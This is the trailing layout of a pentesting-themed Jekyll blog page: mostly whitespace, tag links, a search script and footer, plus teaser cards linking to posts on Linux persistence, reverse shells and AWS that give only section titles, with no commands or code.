    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Linux-Persistence/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Sep 23, 2020
  

  <i class="unloaded">2020-09-23T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux   persistence</h3>
            <div class="text-muted small">
              <p>
                





                Linux - Persistence

Summary


  Basic reverse shell
  Add a root user
  Suid Binary
  Crontab - Reverse shell
  Backdooring a user’s bash_rc
  Backdooring a startup service
  Backdooring a user st...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Cloud-AWS-Pentest/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  1, 2021
  

  <i class="unloaded">2021-05-01T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS</h3>
            <div class="text-muted small">
              <p>
                





                
  Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.


Summary


  AWS
    
      Summary
      Training
      Tools
      AWS Patterns
      AWS - Metadata S...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/Upload-Insecure-Files/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Upload Insecure Files</p>
  </a>
  

  
  <a href="/GraphQL-Injection/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>GraphQL Injection</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

